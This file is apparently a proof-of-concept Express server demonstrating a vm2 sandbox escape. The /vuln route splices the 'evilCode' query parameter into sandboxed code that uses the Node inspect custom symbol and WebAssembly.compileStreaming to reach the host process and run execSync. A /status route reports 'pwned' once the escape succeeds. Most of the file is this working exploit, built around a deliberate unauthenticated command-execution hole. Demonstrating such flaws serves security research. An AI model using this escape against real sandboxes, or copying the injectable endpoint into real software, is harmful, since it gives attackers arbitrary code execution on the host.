const express = require('express')
const vm = require("vm2");
const fs = require("fs");

const app = express()
const port = 3000

app.get('/status', (req, res) => {
  if (fs.existsSync("pwned")) {
    res.send(`You've been pwned !\n`);
  } else {
    res.send(`Everything seems fine\n`);
  }
})

app.post('/vuln', (req, res) => {
  evilCode = req.query.evilCode;
  let wrappingCode = `
  const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');

  obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync(${evilCode});
    },
    valueOf: undefined,
    constructor: undefined,
  }

  WebAssembly.compileStreaming(obj).catch(()=>{});
  `;
  let sandbox = new vm.VM();
  sandbox.run(wrappingCode);
  res.send(`I didn't do it\n`);
})

app.listen(port, () => {
  console.log(`Express server listening on port ${port}`)
})
